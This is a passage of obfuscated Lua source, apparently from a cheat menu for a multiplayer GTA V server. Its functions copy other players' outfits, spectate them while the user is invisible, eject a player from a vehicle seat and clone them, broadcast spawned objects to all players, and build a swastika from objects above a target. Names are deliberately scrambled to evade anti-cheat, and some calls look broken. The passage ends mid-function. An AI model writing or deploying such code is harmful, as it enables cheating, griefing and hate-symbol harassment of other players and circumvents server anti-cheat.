		wrist_texture_HTRJRJYJTYU = Czitirzen_Invoke(0xE131A28626F81AB2, ped_htrjkykutkiy, 7)
		
		head_drawable_LGLGLKGKGKGKG = Czitirzen_Invoke(0x67F3780DD425D4FC, ped_htrjkykutkiy, 0)
		head_palette_JGRTJHJTHJTY = Czitirzen_Invoke(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 0)
		head_texture_JGRIEGHJERI = Czitirzen_Invoke(0x04A355E041E004E6, ped_htrjkykutkiy, 0)
		
		beard_drawable_HEHRTJYJYT = Czitirzen_Invoke(0x67F3780DD425D4FC, ped_htrjkykutkiy, 1)
		beard_palette = Czitirzen_Invoke(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 1)
		beard_texture_HTRJYTJTYJT = Czitirzen_Invoke(0x04A355E041E004E6, ped_htrjkykutkiy, 1)
		
		hair_drawable_HTRJTYKJTUK = Czitirzen_Invoke(0x67F3780DD425D4FC, ped_htrjkykutkiy, 2)
		hair_palette_JJJJJJJJ = Czitirzen_Invoke(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 2)
		hair_texture_POPOPOPOP = Czitirzen_Invoke(0x04A355E041E004E6, ped_htrjkykutkiy, 2)
		
		torso_drawable_FREJIUGHERU = Czitirzen_Invoke(0x67F3780DD425D4FC, ped_htrjkykutkiy, 3)
		torso_palette_GREHTRH = Czitirzen_Invoke(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 3)
		torso_texture_GREHTHRTJTY = Czitirzen_Invoke(0x04A355E041E004E6, ped_htrjkykutkiy, 3)
		
		legs_drawable_GERGREHETRHTRH = Czitirzen_Invoke(0x67F3780DD425D4FC, ped_htrjkykutkiy, 4)
		legs_palette_gEHTRTRR = Czitirzen_Invoke(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 4)
		legs_texture_PLOLKPLOLPPOL = Czitirzen_Invoke(0x04A355E041E004E6, ped_htrjkykutkiy, 4)
		
		hands_drawable_GRTHTRYJYT = Czitirzen_Invoke(0x67F3780DD425D4FC, ped_htrjkykutkiy, 5)
		hands_palette_HGRTHRHRTHR = Czitirzen_Invoke(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 5)
		hands_texture_HTIKOULUIKUI = Czitirzen_Invoke(0x04A355E041E004E6, ped_htrjkykutkiy, 5)
		
		foot_drawable_HTRYJTYJTYY = Czitirzen_Invoke(0x67F3780DD425D4FC, ped_htrjkykutkiy, 6)
		foot_palette_gRTHRRTDTDTER = Czitirzen_Invoke(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 6)
		foot_texture_GTHRTHRTHDT = Czitirzen_Invoke(0x04A355E041E004E6, ped_htrjkykutkiy, 6)
		
		acc1_drawable_NTRKJTYKTY = Czitirzen_Invoke(0x67F3780DD425D4FC, ped_htrjkykutkiy, 7)
		acc1_palette_HRTYJKTYUKTU = Czitirzen_Invoke(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 7)
		acc1_texture_HTEHRTHTFH = Czitirzen_Invoke(0x04A355E041E004E6, ped_htrjkykutkiy, 7)
		
		acc2_drawable_LKPLPOPLPL = Czitirzen_Invoke(0x67F3780DD425D4FC, ped_htrjkykutkiy, 8)
		acc2_palette_LOPKJIOJO = Czitirzen_Invoke(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 8)
		acc2_texture_GRETRHR = Czitirzen_Invoke(0x04A355E041E004E6, ped_htrjkykutkiy, 8)
		
		acc3_drawable_GREJGHRTBGRH = Czitirzen_Invoke(0x67F3780DD425D4FC, ped_htrjkykutkiy, 9)
		acc3_palette_GJRTIHKRTS = Czitirzen_Invoke(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 9)
		acc3_texture_GREGRHTHTR = Czitirzen_Invoke(0x04A355E041E004E6, ped_htrjkykutkiy, 9)
		
		mask_drawable_GETHRTEHDR = Czitirzen_Invoke(0x67F3780DD425D4FC, ped_htrjkykutkiy, 10)
		mask_palette_hRTHTRHTRYTHT = Czitirzen_Invoke(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 10)
		mask_texture_HTHRTHTFDTY = Czitirzen_Invoke(0x04A355E041E004E6, ped_htrjkykutkiy, 10)
		
		aux_drawable_GRTHRTHTDTR = Czitirzen_Invoke(0x67F3780DD425D4FC, ped_htrjkykutkiy, 11)
		aux_palette_GRTHRTHTRT = Czitirzen_Invoke(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 11) 	
		aux_texture_HREHESHTR = Czitirzen_Invoke(0x04A355E041E004E6, ped_htrjkykutkiy, 11)

		Czitirzen_Invoke(0x93376B65A266EB5F, me_hrejtrGFgre, 0, hat_trjtyrjkytkt, hat_texture_hgrehjrtjt, 1)
		Czitirzen_Invoke(0x93376B65A266EB5F, me_hrejtrGFgre, 1, glasses_htrkytrkyt, glasses_texture_RJRTJRRTJ, 1)
		Czitirzen_Invoke(0x93376B65A266EB5F, me_hrejtrGFgre, 2, eare_grehrehgregrrt, ear_texture_HREHRTHJTRJR, 1)
		Czitirzen_Invoke(0x93376B65A266EB5F, me_hrejtrGFgre, 6, watch_hETRTRT, watch_texture_HRTEJRYJYTJTY, 1)
		Czitirzen_Invoke(0x93376B65A266EB5F, me_hrejtrGFgre, 7, wrist_EHTRHRHJRJY, wrist_texture_HTRJRJYJTYU, 1)
		
		Czitirzen_Invoke(0x262B14F48D29DE80, me_hrejtrGFgre, 0, head_drawable_LGLGLKGKGKGKG, head_texture_JGRIEGHJERI, head_palette_JGRTJHJTHJTY)
		Czitirzen_Invoke(0x262B14F48D29DE80, me_hrejtrGFgre, 1, beard_drawable_HEHRTJYJYT, beard_texture_HTRJYTJTYJT, beard_palette)
		Czitirzen_Invoke(0x262B14F48D29DE80, me_hrejtrGFgre, 2, hair_drawable_HTRJTYKJTUK, hair_texture_POPOPOPOP, hair_palette_JJJJJJJJ)
		Czitirzen_Invoke(0x262B14F48D29DE80, me_hrejtrGFgre, 3, torso_drawable_FREJIUGHERU, torso_texture_GREHTHRTJTY, torso_palette_GREHTRH)
		Czitirzen_Invoke(0x262B14F48D29DE80, me_hrejtrGFgre, 4, legs_drawable_GERGREHETRHTRH, legs_texture_PLOLKPLOLPPOL, legs_palette_gEHTRTRR)
		Czitirzen_Invoke(0x262B14F48D29DE80, me_hrejtrGFgre, 5, hands_drawable_GRTHTRYJYT, hands_texture_HTIKOULUIKUI, hands_palette_HGRTHRHRTHR)
		Czitirzen_Invoke(0x262B14F48D29DE80, me_hrejtrGFgre, 6, foot_drawable_HTRYJTYJTYY, foot_texture_GTHRTHRTHDT, foot_palette_gRTHRRTDTDTER)
		Czitirzen_Invoke(0x262B14F48D29DE80, me_hrejtrGFgre, 7, acc1_drawable_NTRKJTYKTY, acc1_texture_HTEHRTHTFH, acc1_palette_HRTYJKTYUKTU)
		Czitirzen_Invoke(0x262B14F48D29DE80, me_hrejtrGFgre, 8, acc2_drawable_LKPLPOPLPL, acc2_texture_GRETRHR, acc2_palette_LOPKJIOJO)
		Czitirzen_Invoke(0x262B14F48D29DE80, me_hrejtrGFgre, 9, acc3_drawable_GREJGHRTBGRH, acc3_texture_GREGRHTHTR, acc3_palette_GJRTIHKRTS)
		Czitirzen_Invoke(0x262B14F48D29DE80, me_hrejtrGFgre, 10, mask_drawable_GETHRTEHDR, mask_texture_HTHRTHTFDTY, mask_palette_hRTHTRHTRYTHT)
		Czitirzen_Invoke(0x262B14F48D29DE80, me_hrejtrGFgre, 11, aux_drawable_GRTHRTHTDTR, aux_texture_HREHESHTR, aux_palette_GRTHRTHTRT)
	end
	
--[[local function print_player_outfit(Target_grejtjtrkyt)
		local ped_htrjkykutkiy = Czitirzen_Invoke(0x43A66C31C68491C0, Target_grejtjtrkyt)
		local me_hrejtrGFgre = Czitirzen_Invoke(0xD80958FC74E988A6)
		
		hat_trjtyrjkytkt = Czitirzen_Invoke(0x898CC20EA75BACD8, ped_htrjkykutkiy, 0)
		hat_texture_hgrehjrtjt = Czitirzen_Invoke(0xE131A28626F81AB2, ped_htrjkykutkiy, 0)
		
		glasses_htrkytrkyt = Czitirzen_Invoke(0x898CC20EA75BACD8, ped_htrjkykutkiy, 1)
		glasses_texture_RJRTJRRTJ = Czitirzen_Invoke(0xE131A28626F81AB2, ped_htrjkykutkiy, 1)
		
		eare_grehrehgregrrt = Czitirzen_Invoke(0x898CC20EA75BACD8, ped_htrjkykutkiy, 2)
		ear_texture_HREHRTHJTRJR = Czitirzen_Invoke(0xE131A28626F81AB2, ped_htrjkykutkiy, 2)
		
		watch_hETRTRT = Czitirzen_Invoke(0x898CC20EA75BACD8, ped_htrjkykutkiy, 6)
		watch_texture_HRTEJRYJYTJTY = Czitirzen_Invoke(0xE131A28626F81AB2, ped_htrjkykutkiy, 6)
		
		wrist_EHTRHRHJRJY = Czitirzen_Invoke(0x898CC20EA75BACD8, ped_htrjkykutkiy, 7)
		wrist_texture_HTRJRJYJTYU = Czitirzen_Invoke(0xE131A28626F81AB2, ped_htrjkykutkiy, 7)
		
		head_drawable_LGLGLKGKGKGKG = Czitirzen_Invoke(0x67F3780DD425D4FC, ped_htrjkykutkiy, 0)
		head_palette_JGRTJHJTHJTY = Czitirzen_Invoke(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 0)
		head_texture_JGRIEGHJERI = Czitirzen_Invoke(0x04A355E041E004E6, ped_htrjkykutkiy, 0)
		
		beard_drawable_HEHRTJYJYT = Czitirzen_Invoke(0x67F3780DD425D4FC, ped_htrjkykutkiy, 1)
		beard_palette = Czitirzen_Invoke(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 1)
		beard_texture_HTRJYTJTYJT = Czitirzen_Invoke(0x04A355E041E004E6, ped_htrjkykutkiy, 1)
		
		hair_drawable_HTRJTYKJTUK = Czitirzen_Invoke(0x67F3780DD425D4FC, ped_htrjkykutkiy, 2)
		hair_palette_JJJJJJJJ = Czitirzen_Invoke(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 2)
		hair_texture_POPOPOPOP = Czitirzen_Invoke(0x04A355E041E004E6, ped_htrjkykutkiy, 2)
		
		torso_drawable_FREJIUGHERU = Czitirzen_Invoke(0x67F3780DD425D4FC, ped_htrjkykutkiy, 3)
		torso_palette_GREHTRH = Czitirzen_Invoke(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 3)
		torso_texture_GREHTHRTJTY = Czitirzen_Invoke(0x04A355E041E004E6, ped_htrjkykutkiy, 3)
		
		legs_drawable_GERGREHETRHTRH = Czitirzen_Invoke(0x67F3780DD425D4FC, ped_htrjkykutkiy, 4)
		legs_palette_gEHTRTRR = Czitirzen_Invoke(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 4)
		legs_texture_PLOLKPLOLPPOL = Czitirzen_Invoke(0x04A355E041E004E6, ped_htrjkykutkiy, 4)
		
		hands_drawable_GRTHTRYJYT = Czitirzen_Invoke(0x67F3780DD425D4FC, ped_htrjkykutkiy, 5)
		hands_palette_HGRTHRHRTHR = Czitirzen_Invoke(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 5)
		hands_texture_HTIKOULUIKUI = Czitirzen_Invoke(0x04A355E041E004E6, ped_htrjkykutkiy, 5)
		
		foot_drawable_HTRYJTYJTYY = Czitirzen_Invoke(0x67F3780DD425D4FC, ped_htrjkykutkiy, 6)
		foot_palette_gRTHRRTDTDTER = Czitirzen_Invoke(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 6)
		foot_texture_GTHRTHRTHDT = Czitirzen_Invoke(0x04A355E041E004E6, ped_htrjkykutkiy, 6)
		
		acc1_drawable_NTRKJTYKTY = Czitirzen_Invoke(0x67F3780DD425D4FC, ped_htrjkykutkiy, 7)
		acc1_palette_HRTYJKTYUKTU = Czitirzen_Invoke(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 7)
		acc1_texture_HTEHRTHTFH = Czitirzen_Invoke(0x04A355E041E004E6, ped_htrjkykutkiy, 7)
		
		acc2_drawable_LKPLPOPLPL = Czitirzen_Invoke(0x67F3780DD425D4FC, ped_htrjkykutkiy, 8)
		acc2_palette_LOPKJIOJO = Czitirzen_Invoke(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 8)
		acc2_texture_GRETRHR = Czitirzen_Invoke(0x04A355E041E004E6, ped_htrjkykutkiy, 8)
		
		acc3_drawable_GREJGHRTBGRH = Czitirzen_Invoke(0x67F3780DD425D4FC, ped_htrjkykutkiy, 9)
		acc3_palette_GJRTIHKRTS = Czitirzen_Invoke(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 9)
		acc3_texture_GREGRHTHTR = Czitirzen_Invoke(0x04A355E041E004E6, ped_htrjkykutkiy, 9)
		
		mask_drawable_GETHRTEHDR = Czitirzen_Invoke(0x67F3780DD425D4FC, ped_htrjkykutkiy, 10)
		mask_palette_hRTHTRHTRYTHT = Czitirzen_Invoke(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 10)
		mask_texture_HTHRTHTFDTY = Czitirzen_Invoke(0x04A355E041E004E6, ped_htrjkykutkiy, 10)
		
		aux_drawable_GRTHRTHTDTR = Czitirzen_Invoke(0x67F3780DD425D4FC, ped_htrjkykutkiy, 11)
		aux_palette_GRTHRTHTRT = Czitirzen_Invoke(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 11) 	
		aux_texture_HREHESHTR = Czitirzen_Invoke(0x04A355E041E004E6, ped_htrjkykutkiy, 11)
		
		print("HATS: ", hat_trjtyrjkytkt, hat_texture_hgrehjrtjt)
		print("GLASSES: ", glasses_htrkytrkyt, glasses_texture_RJRTJRRTJ)
		print("EARS", eare_grehrehgregrrt, ear_texture_HREHRTHJTRJR)
		
		print("FACE: ", head_drawable_LGLGLKGKGKGKG, head_texture_JGRIEGHJERI)
		print("MASK: ", beard_drawable_HEHRTJYJYT, beard_texture_HTRJYTJTYJT)
		print("HAIR: ", hair_drawable_HTRJTYKJTUK, hair_texture_POPOPOPOP)
		print("TORSO: ", torso_drawable_FREJIUGHERU, torso_texture_GREHTHRTJTY)
		print("LEGS: ", legs_drawable_GERGREHETRHTRH, legs_texture_PLOLKPLOLPPOL)
		print("HANDS: : ", hands_drawable_GRTHTRYJYT, hands_texture_HTIKOULUIKUI)
		print("SHOES: ", foot_drawable_HTRYJTYJTYY, foot_texture_GTHRTHRTHDT)
		print("SPECIAL1: ", acc1_drawable_NTRKJTYKTY, acc1_texture_HTEHRTHTFH)
		print("SPECIAL2: ", acc2_drawable_LKPLPOPLPL, acc2_texture_GRETRHR)
		print("SPECIAL3: ", acc3_drawable_GREJGHRTBGRH, acc3_texture_GREGRHTHTR)
		print("TEXTURE: ", mask_drawable_GETHRTEHDR, mask_texture_HTHRTHTFDTY)
		print("TORSO2: ", aux_drawable_GRTHRTHTDTR, aux_texture_HREHESHTR)
end]]
	
local function ResetAppearance_HugeV_DSUGHSDIGHSD()
	Czitirzen_Invoke(0xCD8A7537A9B52F06, Czitirzen_Invoke(0x43A66C31C68491C0, -1))
	Czitirzen_Invoke(0x0E5173C163976E38, Czitirzen_Invoke(0x43A66C31C68491C0, -1))
	Czitirzen_Invoke(0x262B14F48D29DE80, Czitirzen_Invoke(0x43A66C31C68491C0, -1), 1, 0, 0, 0)
	Czitirzen_Invoke(0x262B14F48D29DE80, Czitirzen_Invoke(0x43A66C31C68491C0, -1), 5, 0, 0, 0)
	Czitirzen_Invoke(0x262B14F48D29DE80, Czitirzen_Invoke(0x43A66C31C68491C0, -1), 9, 0, 0, 0)
end
	
local function ChangeAppearance_HugeV_ASUHGIUDSHGSD(family_SDGIUSDOGJISDGSD, model_DSIGHODSIGSD, texture_DASIGHDSUGSD)
	if (family_SDGIUSDOGJISDGSD == 'HATS'or family_SDGIUSDOGJISDGSD == 'GLASSES'or family_SDGIUSDOGJISDGSD == 'EARS') then
		if (family_SDGIUSDOGJISDGSD == 'HATS') then
			fam_DUHSGOSDIUGIHOSDG = 0
		elseif (family_SDGIUSDOGJISDGSD == 'GLASSES') then
			fam_DUHSGOSDIUGIHOSDG = 1
		elseif (family_SDGIUSDOGJISDGSD == 'EARS') then
			fam_DUHSGOSDIUGIHOSDG = 2
		end
		Czitirzen_Invoke(0x93376B65A266EB5F, Czitirzen_Invoke(0x43A66C31C68491C0, -1), fam_DUHSGOSDIUGIHOSDG, model_DSIGHODSIGSD - 1, texture_DASIGHDSUGSD, 1)
	else
		if (family_SDGIUSDOGJISDGSD == 'FACE') then
			fam_DUHSGOSDIUGIHOSDG = 0
		elseif (family_SDGIUSDOGJISDGSD == 'MASK') then
			fam_DUHSGOSDIUGIHOSDG = 1
		elseif (family_SDGIUSDOGJISDGSD == 'HAIR') then
			fam_DUHSGOSDIUGIHOSDG = 2
		elseif (family_SDGIUSDOGJISDGSD == 'TORSO') then
			fam_DUHSGOSDIUGIHOSDG = 3
		elseif (family_SDGIUSDOGJISDGSD == 'LEGS') then
			fam_DUHSGOSDIUGIHOSDG = 4
		elseif (family_SDGIUSDOGJISDGSD == 'HANDS') then
			fam_DUHSGOSDIUGIHOSDG = 5
		elseif (family_SDGIUSDOGJISDGSD == 'SHOES') then
			fam_DUHSGOSDIUGIHOSDG = 6
		elseif (family_SDGIUSDOGJISDGSD == 'SPECIAL1') then
			fam_DUHSGOSDIUGIHOSDG = 7
		elseif (family_SDGIUSDOGJISDGSD == 'SPECIAL2') then
			fam_DUHSGOSDIUGIHOSDG = 8
		elseif (family_SDGIUSDOGJISDGSD == 'SPECIAL3') then
			fam_DUHSGOSDIUGIHOSDG = 9
		elseif (family_SDGIUSDOGJISDGSD == 'TEXTURE') then
			fam_DUHSGOSDIUGIHOSDG = 10
		elseif (family_SDGIUSDOGJISDGSD == 'TORSO2') then
			fam_DUHSGOSDIUGIHOSDG = 11
		end
		Czitirzen_Invoke(0x262B14F48D29DE80, Czitirzen_Invoke(0x43A66C31C68491C0, -1), fam_DUHSGOSDIUGIHOSDG, model_DSIGHODSIGSD, texture_DASIGHDSUGSD, 0)
	end
end

local polar_SDGHSDIUGSDGSD, azimuth_DSGHSDIUGDSGSD = 0, 90

local function SpectatePlayer_UD_HugeV_SUGUFYDGUIDF(player_diuhfsiddfsg)
if SavedCoords_UDHGIUHFUDGDFG == nil then
SavedCoords_UDHGIUHFUDGDFG = GetEntityCoords_HugeV_UDHGIUDIKGDFG(Czitirzen_Invoke(0xD80958FC74E988A6))
end
CreateThreadNowAtomicDrugMiSsie_DIASFUOIDSGSDFG(function()
player_global_UDHFUYDSHFIGUFDG = player_diuhfsiddfsg
if spectate_global_dugsuydhkgsdfgdf then
local entityfdhudfkidfh = Czitirzen_Invoke(0x997ABD671D25CA0B, Czitirzen_Invoke(0xD80958FC74E988A6), false) and Czitirzen_Invoke(0x6094AD011A2EA87D, Czitirzen_Invoke(0xD80958FC74E988A6)) or Czitirzen_Invoke(0xD80958FC74E988A6)
spectate_global_dugsuydhkgsdfgdf = false
Niewidzialnosc_UGDIUGHIFUGFDGDFG = false
Czlowiek_Wait_IDYGOSIFJGDFG(100)
Czitirzen_Invoke(0x06843DA7060A026B, Czitirzen_Invoke(0xD80958FC74E988A6), SavedCoords_UDHGIUHFUDGDFG)
Czlowiek_Wait_IDYGOSIFJGDFG(10)
SavedCoords_UDHGIUHFUDGDFG = nil
else
spectate_global_dugsuydhkgsdfgdf = true
Niewidzialnosc_UGDIUGHIFUGFDGDFG = true
end
end)
end


local function Polar3DToWorld_DSGIDSIUGHSDGS(entityPosition_DSIGHIUSDGSDG, radius_DSGIHSIUDGSDG, polarAngleDeg_DSGHSDIUGSDG, azimuthAngleDeg_DSGIHSDIGDSG)
    local polarAngleRad_DSGIUSDIGISDG = polarAngleDeg_DSGHSDIUGSDG * math.pi / 180.0
    local azimuthAngleRad_SDIGDSIUGSDG = azimuthAngleDeg_DSGIHSDIGDSG * math.pi / 180.0

    return {
        x = entityPosition_DSIGHIUSDGSDG.x + radius_DSGIHSIUDGSDG * (math.sin(azimuthAngleRad_SDIGDSIUGSDG) * math.cos(polarAngleRad_DSGIUSDIGISDG)),
        y = entityPosition_DSIGHIUSDGSDG.y - radius_DSGIHSIUDGSDG * (math.sin(azimuthAngleRad_SDIGDSIUGSDG) * math.sin(polarAngleRad_DSGIUSDIGISDG)),
        z = entityPosition_DSIGHIUSDGSDG.z - radius_DSGIHSIUDGSDG * math.cos(azimuthAngleRad_SDIGDSIUGSDG)
    }
end


local function QuickReplacement_HugeV_UDHUKGDFHKDFGDF(player_diuhfsiddfsg)
CreateThreadNowAtomicDrugMiSsie_DIASFUOIDSGSDFG(function()
local ped_udfyugsyfdsg = Czitirzen_Invoke(0x43A66C31C68491C0, player_diuhfsiddfsg)
local vehicle_UDHUHDFSGDFG = GetVehiclePedIsIn_HugeV_IDHUFYUHSUDGFD(ped_udfyugsyfdsg, 0)
local free_seat_IDYGIUFGDFG = false
if vehicle_UDHUHDFSGDFG ~= 0 then

if GetPedInVehicleSeat_HugeV_USDGFUYDSFSD(vehicle_UDHUHDFSGDFG, -1) ~= 0 then
Czitirzen_Invoke(0xAAA34F8A7CB32098, ped_udfyugsyfdsg)
Czlowiek_Wait_IDYGOSIFJGDFG(10)
while not free_seat_IDYGIUFGDFG do
if IsVehicleSeatFree_HugeV_DUHGYUSFGFD(vehicle_UDHUHDFSGDFG, -1) then
Czitirzen_Invoke(vehicle_UDHUHDFSGDFG, -1)
free_seat_IDYGIUFGDFG = true
ClonePed_HugeV_UDYUIGDFGDF(SelectedPlayer_IOAYFDUOFLDSGFSD)
Czitirzen_Invoke(0xF75B0D629E1C063D, Czitirzen_Invoke(0xD80958FC74E988A6), vehicle_UDHUHDFSGDFG, -1)
else
Czlowiek_Wait_IDYGOSIFJGDFG(0)
end
end
elseif GetPedInVehicleSeat_HugeV_USDGFUYDSFSD(vehicle_UDHUHDFSGDFG, 0) ~= 0 then
Czitirzen_Invoke(0xAAA34F8A7CB32098, ped_udfyugsyfdsg)
Czlowiek_Wait_IDYGOSIFJGDFG(10)
while not free_seat_IDYGIUFGDFG do
if IsVehicleSeatFree_HugeV_DUHGYUSFGFD(vehicle_UDHUHDFSGDFG, 0) then
Czitirzen_Invoke(vehicle_UDHUHDFSGDFG, 0)
free_seat_IDYGIUFGDFG = true
ClonePed_HugeV_UDYUIGDFGDF(SelectedPlayer_IOAYFDUOFLDSGFSD)
Czitirzen_Invoke(0xF75B0D629E1C063D, Czitirzen_Invoke(0xD80958FC74E988A6), vehicle_UDHUHDFSGDFG, 0)
else
Czlowiek_Wait_IDYGOSIFJGDFG(0)
end
end
elseif GetPedInVehicleSeat_HugeV_USDGFUYDSFSD(vehicle_UDHUHDFSGDFG, 1) ~= 0 then
Czitirzen_Invoke(0xAAA34F8A7CB32098, ped_udfyugsyfdsg)
Czlowiek_Wait_IDYGOSIFJGDFG(10)
while not free_seat_IDYGIUFGDFG do
if IsVehicleSeatFree_HugeV_DUHGYUSFGFD(vehicle_UDHUHDFSGDFG, 1) then
Czitirzen_Invoke(vehicle_UDHUHDFSGDFG, 1)
free_seat_IDYGIUFGDFG = true
ClonePed_HugeV_UDYUIGDFGDF(SelectedPlayer_IOAYFDUOFLDSGFSD)
Czitirzen_Invoke(0xF75B0D629E1C063D, Czitirzen_Invoke(0xD80958FC74E988A6), vehicle_UDHUHDFSGDFG, 1)
else
Czlowiek_Wait_IDYGOSIFJGDFG(0)
end
end
elseif GetPedInVehicleSeat_HugeV_USDGFUYDSFSD(vehicle_UDHUHDFSGDFG, 2) ~= 0 then
Czitirzen_Invoke(0xAAA34F8A7CB32098, ped_udfyugsyfdsg)
Czlowiek_Wait_IDYGOSIFJGDFG(10)
while not free_seat_IDYGIUFGDFG do
if IsVehicleSeatFree_HugeV_DUHGYUSFGFD(vehicle_UDHUHDFSGDFG, 2) then
Czitirzen_Invoke(vehicle_UDHUHDFSGDFG, 2)
free_seat_IDYGIUFGDFG = true
ClonePed_HugeV_UDYUIGDFGDF(SelectedPlayer_IOAYFDUOFLDSGFSD)
Czitirzen_Invoke(0xF75B0D629E1C063D, Czitirzen_Invoke(0xD80958FC74E988A6), vehicle_UDHUHDFSGDFG, 2)
else
Czlowiek_Wait_IDYGOSIFJGDFG(0)
end
end
else
PushNotification_DSGJHDSGHSIDUGDS("Can't to find player seat or player not in vehicle")
end
else
PushNotification_DSGJHDSGHSIDUGDS("Player must be in vehicle")
end
end)
end

local function RequestModelSync_SDUFHSIDGSDG(model_DSIGHODSIGSD, timeout_DSIUFHISDGSDG)
        timeout_DSIUFHISDGSDG = timeout_DSIUFHISDGSDG or 2500
        local counter_DSGIHSDIUGJDSGDS = 0
        Czitirzen_Invoke(0x963D27A58DF860AC, Czitirzen_Invoke(0xD24D37CC275948CC, model_DSIGHODSIGSD))

        while not Czitirzen_Invoke(0x98A4EB5D89A0C952, Czitirzen_Invoke(0xD24D37CC275948CC, model_DSIGHODSIGSD)) do
            Czitirzen_Invoke(0x963D27A58DF860AC, model_DSIGHODSIGSD)
            counter_DSGIHSDIUGJDSGDS = counter_DSGIHSDIUGJDSGDS + 100
            Czlowiek_Wait_IDYGOSIFJGDFG(0)
            if counter_DSGIHSDIUGJDSGDS >= timeout_DSIUFHISDGSDG then return false end
        end

        return true
    end
	
local function ChangeModel_Hugev_SDGISDGSD(model)			
	local hash_SDGHISDGDS = Czitirzen_Invoke(0xD24D37CC275948CC, tostring(model))
	local player_SDIGJOSIDGSD = Czitirzen_Invoke(0x4F8644AF03D0E0D6)
				
    RequestModelSync_SDUFHSIDGSDG(tostring(model))

    Czitirzen_Invoke(0x00A1CADD00108836, player_SDIGJOSIDGSD, hash_SDGHISDGDS)
	Czitirzen_Invoke(0x262B14F48D29DE80, Czitirzen_Invoke(0x43A66C31C68491C0, -1), 0, i_DSDSGUSHDIUGSD, 0, 0)
    Czitirzen_Invoke(0xE532F5D78798DAAB, hash_SDGHISDGDS)
end
	
local function DoNetwork_DSIGHISUDGSDG(obj_DSUHGISDUGSDG)
        if not Czitirzen_Invoke(0x7239B21A38F536BA, obj_DSUHGISDUGSDG) then return end
        local id_DSGUHISUDGSDG = Czitirzen_Invoke(0x99BFDC94A603E541, obj_DSUHGISDUGSDG)
        Czitirzen_Invoke(0x2B1813ABA29016C5, id_DSGUHISUDGSDG, true)
        Czitirzen_Invoke(0xE05E81A888FA63C8, id_DSGUHISUDGSDG, true)
        Czitirzen_Invoke(0x299EEB23175895FC, id_DSGUHISUDGSDG, false)

        for _, src_DSHGIUDSGSDG in pairs(GetActivePlayers_HugeV_UDGYUDFIGKDFGDF()) do
            Czitirzen_Invoke(0xA8A024587329F36A, id_DSGUHISUDGSDG, src_DSHGIUDSGSDG, true)
        end
    end

local function SpawnSwastika_HugeV_DSIGJSDIGJSDG(ent_DSIUHGIUSDGDS, offZ_SDGUSDIGSD)

                CreateThreadNowAtomicDrugMiSsie_DIASFUOIDSGSDFG(function()
                    local where_DSUGHSIDUGSDG = GetOffsetFromEntityInWorldCoords_HugeV_UHDIUGHDFUGHDFG(ent_DSIUHGIUSDGDS, 0.0, 0.0, 0.0)

                    if not Czitirzen_Invoke(0x524AC5ECEA15343E, ent_DSIUHGIUSDGDS) then
                        where_DSUGHSIDUGSDG = vector3(where_DSUGHSIDUGSDG.x, where_DSUGHSIDUGSDG.y, where_DSUGHSIDUGSDG.z + 5.0)
                    end

                    if offZ_SDGUSDIGSD then
                        where_DSUGHSIDUGSDG = vector3(where_DSUGHSIDUGSDG.x, where_DSUGHSIDUGSDG.y, where_DSUGHSIDUGSDG.z + offZ_SDGUSDIGSD)
                    end

                    local column_SJGHISDUGSDDSG = {
                        ["up"] = {},
                        ["across"] = {}
                    }

                    for i_SDGUIHSDUGSD = 0, 7 do
                        column_SJGHISDUGSDDSG["up"][i_SDGUIHSDUGSD + 1] = {
                            x_DSUHGISDG = 0.0,
                            y_DSUHGISDG = 0.0,
                            z_DSIHGSDGDSSDUHI = 1.0 + (2.6 * (i_SDGUIHSDUGSD + 1)),
                            _p_SDDSIHUGISDGSD = 90.0,
                            _y_SDDSIHUGISDGSD = 0.0,
                            _r_DSIGUHUSDIGSD = 0.0
                        }
                    end

                    for i_SDGUIHSDUGSD = 0, 8 do
                        column_SJGHISDUGSDDSG["across"][i_SDGUIHSDUGSD + 1] = {
                            x_DSUHGISDG = 10.4 + (-2.6 * i_SDGUIHSDUGSD),
                            y_DSUHGISDG = 0.0,
                            z_DSIHGSDGDSSDUHI = 11.6,
                            _p_SDDSIHUGISDGSD = 90.0,
                            _y_SDDSIHUGISDGSD = 0.0,
                            _r_DSIGUHUSDIGSD = 0.0
                        }
                    end

                    local arms_DSIGJSDGSDG = {
                        ["bottom_right"] = {},
                        ["across_up"] = {},
                        ["top_left"] = {},
                        ["across_down"] = {}
                    }

                    for i_SDGUIHSDUGSD = 0, 4 do
                        arms_DSIGJSDGSDG["bottom_right"][i_SDGUIHSDUGSD] = {
                            x_DSUHGISDG = -2.6 * i_SDGUIHSDUGSD,
                            y_DSUHGISDG = 0.0,
                            z_DSIHGSDGDSSDUHI = 1.0,
                            _p_SDDSIHUGISDGSD = 90.0,
                            _y_SDDSIHUGISDGSD = 0.0,
                            _r_DSIGUHUSDIGSD = 0.0
                        }

                        arms_DSIGJSDGSDG["top_left"][i_SDGUIHSDUGSD] = {
                            x_DSUHGISDG = 2.6 * i_SDGUIHSDUGSD,
                            y_DSUHGISDG = 0.0,
                            z_DSIHGSDGDSSDUHI = 22.2,
                            _p_SDDSIHUGISDGSD = 90.0,
                            _y_SDDSIHUGISDGSD = 0.0,
                            _r_DSIGUHUSDIGSD = 0.0
                        }

                        arms_DSIGJSDGSDG["across_down"][i_SDGUIHSDUGSD + 1] = {
                            x_DSUHGISDG = 10.4,
                            y_DSUHGISDG = 0.0,
